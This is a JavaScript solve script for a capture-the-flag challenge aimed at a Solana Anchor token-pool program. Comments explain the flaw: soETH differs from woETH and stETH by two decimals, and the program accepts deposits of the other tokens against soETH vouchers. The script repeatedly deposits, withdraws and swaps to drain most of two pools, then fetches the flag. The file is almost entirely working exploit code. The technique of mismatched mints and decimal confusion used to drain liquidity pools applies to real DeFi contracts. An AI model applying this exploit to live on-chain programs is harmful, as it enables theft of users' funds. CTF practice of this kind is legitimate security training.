import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as splToken from "@solana/spl-token";
import * as api from "./api.js"; 
import { parseAccounts, sendInstructions } from "./util.js";
import { Keypair, PublicKey, SystemProgram, SYSVAR_RENT_PUBKEY, Transaction } from "@solana/web3.js";
import { getAssociatedTokenAddress, MINT_SIZE, TOKEN_PROGRAM_ID } from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge2.json", 'utf-8'));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeTwo;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

const timer = ms => new Promise( res => setTimeout(res, ms));

// all player code goes here
// soETH has 2 less decimals than the other ones
// we can deposit woETH/stETH instead of soETH and get soETH vouchers -> swap to woETH/stETH
async function attack() {
    const woETHTokenAccount = await getAssociatedTokenAddress(accounts.woEthMint, player.publicKey);
    const soETHTokenAccount = await getAssociatedTokenAddress(accounts.soEthMint, player.publicKey);
    const stETHTokenAccount = await getAssociatedTokenAddress(accounts.stEthMint, player.publicKey);

    const woETHVoucherTokenAccount = await getAssociatedTokenAddress(accounts.woEthVoucherMint, player.publicKey);
    const soETHVoucherTokenAccount = await getAssociatedTokenAddress(accounts.soEthVoucherMint, player.publicKey);
    const stEthTokenAccount = await getAssociatedTokenAddress(accounts.stEthVoucherMint, player.publicKey);

    const exploitwoETH = async (amount) => {
        const exploitTX = new Transaction();
        // deposit woETH but get soETH vouchers
        exploitTX.add(program.instruction.deposit(new BN(amount), {
            accounts: {
                player: player.publicKey,
                depositor: player.publicKey,
                state: accounts.state,
                depositMint: accounts.soEthMint,
                pool: accounts.woEthPool,
                poolAccount: accounts.woEthPoolAccount,
                voucherMint: accounts.soEthVoucherMint,
                depositorAccount: woETHTokenAccount,
                depositorVoucherAccount: soETHVoucherTokenAccount,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        }));

        // withdraw from soETH pool
        exploitTX.add(program.instruction.withdraw(new BN(amount), {
            accounts: {
                player: player.publicKey,
                depositor: player.publicKey,
                state: accounts.state,
                depositMint: accounts.soEthMint,
                pool: accounts.soEthPool,
                poolAccount: accounts.soEthPoolAccount,
                voucherMint: accounts.soEthVoucherMint,
                depositorAccount: soETHTokenAccount,
                depositorVoucherAccount: soETHVoucherTokenAccount,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        }));

        // swap from soETH to woETH
        exploitTX.add(program.instruction.swap(new BN(amount), {
            accounts: {
                player: player.publicKey,
                swapper: player.publicKey,
                state: accounts.state,
                fromPool: accounts.soEthPool,
                toPool: accounts.woEthPool,
                fromPoolAccount: accounts.soEthPoolAccount,
                toPoolAccount: accounts.woEthPoolAccount,
                fromSwapperAccount: soETHTokenAccount,
                toSwapperAccount: woETHTokenAccount,
                tokenProgram: TOKEN_PROGRAM_ID
            }
        }))

        exploitTX.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
        exploitTX.feePayer = player.publicKey;
        exploitTX.sign(player);
        await conn.sendRawTransaction(exploitTX.serialize(), {preflightCommitment: 'processed'});
    }

    const exploitstETH = async (amount) => {
        const exploitTX = new Transaction();
        // deposit woETH but get soETH vouchers
        exploitTX.add(program.instruction.deposit(new BN(amount), {
            accounts: {
                player: player.publicKey,
                depositor: player.publicKey,
                state: accounts.state,
                depositMint: accounts.soEthMint,
                pool: accounts.stEthPool,
                poolAccount: accounts.stEthPoolAccount,
                voucherMint: accounts.soEthVoucherMint,
                depositorAccount: stETHTokenAccount,
                depositorVoucherAccount: soETHVoucherTokenAccount,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        }));

        // withdraw from soETH pool
        exploitTX.add(program.instruction.withdraw(new BN(amount), {
            accounts: {
                player: player.publicKey,
                depositor: player.publicKey,
                state: accounts.state,
                depositMint: accounts.soEthMint,
                pool: accounts.soEthPool,
                poolAccount: accounts.soEthPoolAccount,
                voucherMint: accounts.soEthVoucherMint,
                depositorAccount: soETHTokenAccount,
                depositorVoucherAccount: soETHVoucherTokenAccount,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        }));

        // swap from soETH to woETH
        exploitTX.add(program.instruction.swap(new BN(amount), {
            accounts: {
                player: player.publicKey,
                swapper: player.publicKey,
                state: accounts.state,
                fromPool: accounts.soEthPool,
                toPool: accounts.stEthPool,
                fromPoolAccount: accounts.soEthPoolAccount,
                toPoolAccount: accounts.stEthPoolAccount,
                fromSwapperAccount: soETHTokenAccount,
                toSwapperAccount: stETHTokenAccount,
                tokenProgram: TOKEN_PROGRAM_ID
            }
        }))

        exploitTX.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
        exploitTX.feePayer = player.publicKey;
        exploitTX.sign(player);
        await conn.sendRawTransaction(exploitTX.serialize(), {preflightCommitment: 'processed'});
    }

    // there's initially 100_000_000 tokens in each pool
    // so we got a bit of work to do
    await exploitwoETH(1_000);
    await timer(500);
    // we now have 10_000 woETH
    // pool has 99_990_000 woETH
    await exploitwoETH(100_000);
    await timer(500);
    // we now have 10_000_000 woETH
    // pool has 89_990_000 woETH
    await exploitwoETH(800_000);
    // we now have 80_000_000 woETH

    await exploitstETH(1_000);
    await timer(500);
    // we now have 10_000 stETH
    await exploitstETH(100_000);
    // we now have 10_000_000 stETH
    await exploitstETH(800_000);
    // we now have all 80_000_000 stETH as well
}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 2);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
